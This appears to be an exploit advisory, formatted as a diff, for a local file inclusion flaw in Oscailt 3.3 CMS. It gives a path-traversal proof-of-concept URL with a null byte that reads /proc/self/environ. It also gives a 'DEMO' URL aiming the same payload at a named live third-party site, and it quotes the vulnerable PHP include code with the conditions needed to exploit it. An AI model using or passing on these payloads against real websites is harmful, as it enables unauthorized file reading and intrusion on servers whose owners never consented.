@@ -1,0 +1,47 @@
+[0] Oscailt 3.3 CMS 
+[0] Download: http://sourceforge.net/projects/oscailt/
+[0] Bug: Local File Inclusion in index.php file !
+[0] Author: s4r4d0@yahoo.com
+[0] Team: Fatal Error
+[0] Poc: http://www.site.com/index.php?obj_id=/../../../../../../../../../../proc/self/environ%00
+[0] DEMO:http://imemc.org/index.php?obj_id=/../../../../../../../../../../proc/self/environ%00
+[0] Greetz: Elemento_pcx - z4i0n - m4v3rick - HADES - Hualdo - Derf - DD3str0y3r - Obz !!!
+[0] Made in Brazil - SP
+[0] Source Code: 
+# SecurityReason Note :
+#
+# The option "Use Friendly URL's" in configuration must be set off
+#
+# Vulnerable Code in index.php :
+#
+# $target_indyobject_id = getRequestTargetObjectID();
+# ...
+# if(!$use_live)
+# {
+#   $cachefile = getObjectCacheIndexFile($target_indyobject_id);
+#   if(file_exists($cachefile))
+#   {
+#      include_once($cachefile);
+#   }
+#
+# in function getObjectCacheIndexFile() we have ...
+#
+# function getObjectCacheIndexFile($id)
+# {
+#   $dir = getObjectCacheDir($id);
+#   $f = $id.'.inc';
+#   return $dir.$f;
+# }
+# 
+# As we can see , $cachefile try include inc file in cache dir.
+#
+# magic_quotes = Off // to use %00 null byte
+#
+# - sp3x
+#
+
+[0]Reference: http://securityreason.com/exploitalert/7422
+
+
+
+      
